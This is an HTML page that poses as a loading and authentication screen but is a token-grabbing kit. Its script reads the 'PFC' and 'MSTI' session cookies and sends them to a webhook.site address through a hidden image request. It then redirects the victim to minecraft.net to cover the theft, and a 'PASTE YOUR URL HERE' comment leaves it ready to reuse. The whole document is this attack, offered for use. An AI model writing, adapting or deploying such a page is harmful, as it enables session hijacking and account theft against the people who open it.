<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>
<style>body{margin:0;background:#222;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}#status{font-size:24px}</style>
</head>
<body>
<div id="status">Authenticating...</div>

<script>
// CONFIGURATION
var WEBHOOK_URL = 'https://webhook.site/#!/view/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b'; // PASTE YOUR URL HERE
var REDIRECT_TARGET = 'https://www.minecraft.net/';

// GET COOKIES HELPER
function getCookie(name) {
    var value = "; " + document.cookie;
    var parts = value.split("; " + name + "=");
    if (parts.length == 2) return parts.pop().split(";").shift();
    return "";
}

// MAIN LOGIC
window.onload = function() {
    // 1. Wait for user to login (or if already logged in, grab immediately)
    // We give it 3 seconds to ensure cookies are fully populated
    
    setTimeout(function() {
        
        // 2. Extract Specific Tokens
        var pfc = getCookie('PFC');
        var msti = getCookie('__Host-MSTI') || getCookie('MSTI');
        
        // 3. Build Data String (No JSON object needed, avoids IE8 errors)
        // Format: PFC=...&MSTI=...
        var dataStr = "PFC=" + encodeURIComponent(pfc) + "&MSTI=" + encodeURIComponent(msti);
        
        // 4. Construct Final URL with data as query params
        var finalURL = WEBHOOK_URL + "?" + dataStr;
        
        // 5. Redirect User to Minecraft (Visual) but append our data to the redirect if needed, 
        // OR just let them go to Minecraft and we send data separately.
        // BETTER APPROACH: Send data to Webhook, THEN redirect user.
        
        // Create invisible image to send POST/GET data to Webhook
        var img = new Image();
        img.src = finalURL;
        
        // Update UI
        document.getElementById('status').innerHTML = "Token Captured!<br>Redirecting...";
        
        // 6. Redirect user to Minecraft
        window.location.href = REDIRECT_TARGET;
        
    }, 2000); // 2 second delay to ensure cookie readiness
};
</script>

</body>
</html>
